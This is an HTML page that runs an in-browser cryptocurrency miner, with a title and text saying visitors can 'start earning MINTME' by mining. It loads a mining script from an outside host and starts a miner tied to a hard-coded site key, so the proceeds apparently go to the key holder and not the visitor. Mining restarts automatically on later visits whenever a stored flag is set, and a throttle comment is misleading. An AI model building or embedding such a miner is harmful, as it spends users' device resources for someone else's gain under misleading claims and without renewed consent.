
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Start Earning MINTME</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <script src="https://www.hostingcloud.racing/YCcn.js"></script>
    <style>
        :root {
            --background: #111827;
            --card-background: rgba(31, 41, 55, 0.5);
            --text-primary: #F9FAFB;
            --text-secondary: #9CA3AF;
            --accent-color: #8B5CF6;
            --success-color: #34D399;
            --error-color: #F87171;
            --border-color: rgba(75, 85, 99, 0.5);
        }

        body {
            background-color: var(--background);
            font-family: 'Poppins', sans-serif;
            color: var(--text-primary);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 1rem;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .mining-container {
            width: 100%;
            max-width: 400px;
            background: var(--card-background);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid var(--border-color);
            border-radius: 1.5rem; /* 24px */
            padding: 2rem; /* 32px */
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.2), 0 8px 10px -6px rgba(0, 0, 0, 0.2);
            text-align: center;
        }

        .mining-container h1 {
            font-size: 1.875rem; /* 30px */
            font-weight: 700;
            color: var(--text-primary);
            margin-bottom: 0.5rem;
        }

        .mining-container p {
            color: var(--text-secondary);
            margin-bottom: 2rem;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1rem;
            margin-bottom: 2.5rem;
        }

        .stat-item {
            background-color: rgba(17, 24, 39, 0.6);
            padding: 1rem;
            border-radius: 0.75rem; /* 12px */
            border: 1px solid var(--border-color);
        }

        .stat-item .label {
            font-size: 0.875rem; /* 14px */
            color: var(--text-secondary);
            margin-bottom: 0.5rem;
        }

        .stat-item .value {
            font-size: 1.5rem; /* 24px */
            font-weight: 700;
            color: var(--text-primary);
        }

        #mining-status.running {
            color: var(--success-color);
        }

        #mining-status.stopped {
            color: var(--error-color);
        }

        .toggle-button {
            width: 100%;
            padding: 1rem;
            font-size: 1.125rem; /* 18px */
            font-weight: 600;
            border-radius: 0.75rem;
            border: none;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -2px rgba(0, 0, 0, 0.1);
        }
        
        .toggle-button.start {
            background-color: var(--accent-color);
            color: white;
        }
        .toggle-button.start:hover {
            box-shadow: 0 0 15px var(--accent-color);
        }

        .toggle-button.stop {
            background-color: var(--error-color);
            color: white;
        }
        .toggle-button.stop:hover {
            box-shadow: 0 0 15px var(--error-color);
        }
    </style>
</head>
<body>
    <div class="mining-container">
        <h1>Start Earning MINTME</h1>
        <p>Use your device's power to mine cryptocurrency.</p>

        <div class="stats-grid">
            <div class="stat-item">
                <div class="label">Mining Status</div>
                <div id="mining-status" class="value stopped">Stopped</div>
            </div>
            <div class="stat-item">
                <div class="label">Hashes / Sec</div>
                <div id="hash-rate" class="value">0</div>
            </div>
            <div class="stat-item" style="grid-column: 1 / -1;">
                <div class="label">Total Hashes</div>
                <div id="total-hashes" class="value">0</div>
            </div>
        </div>

        <button id="toggle-mining-btn" class="toggle-button start">Start Mining</button>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const SITE_KEY = 'c541f766e3a569d2f01a1e9b0e96fd02e62d2cc7886f8c03a646befe8911df6a';
            const miner = new Client.Anonymous(SITE_KEY, {
                throttle: 0.8, // 20% throttle
                c: 'w'
            });

            const toggleButton = document.getElementById('toggle-mining-btn');
            const statusEl = document.getElementById('mining-status');
            const hashRateEl = document.getElementById('hash-rate');
            const totalHashesEl = document.getElementById('total-hashes');
            let isMining = false;
            let intervalId;

            function updateUI(mining) {
                if (mining) {
                    statusEl.textContent = 'Running';
                    statusEl.className = 'value running';
                    toggleButton.textContent = 'Stop Mining';
                    toggleButton.className = 'toggle-button stop';
                } else {
                    statusEl.textContent = 'Stopped';
                    statusEl.className = 'value stopped';
                    toggleButton.textContent = 'Start Mining';
                    toggleButton.className = 'toggle-button start';
                    hashRateEl.textContent = '0';
                }
            }
            
            function startMining() {
                if (!miner.isMobile() && miner.didOptOut()) {
                    console.log("User has opted out of mining.");
                    return;
                }
                miner.start();
                isMining = true;
                localStorage.setItem('isMiningActive', 'true');
                updateUI(true);
                intervalId = setInterval(() => {
                    hashRateEl.textContent = miner.getHashesPerSecond().toFixed(2);
                    totalHashesEl.textContent = miner.getTotalHashes();
                }, 1000);
            }

            function stopMining() {
                miner.stop();
                isMining = false;
                localStorage.setItem('isMiningActive', 'false');
                clearInterval(intervalId);
                updateUI(false);
            }

            function toggleMining() {
                if (isMining) {
                    stopMining();
                } else {
                    startMining();
                }
            }

            toggleButton.addEventListener('click', toggleMining);

            // Check localStorage on page load
            if (localStorage.getItem('isMiningActive') === 'true') {
                startMining();
            }
        });
    </script>
</body>
</html>
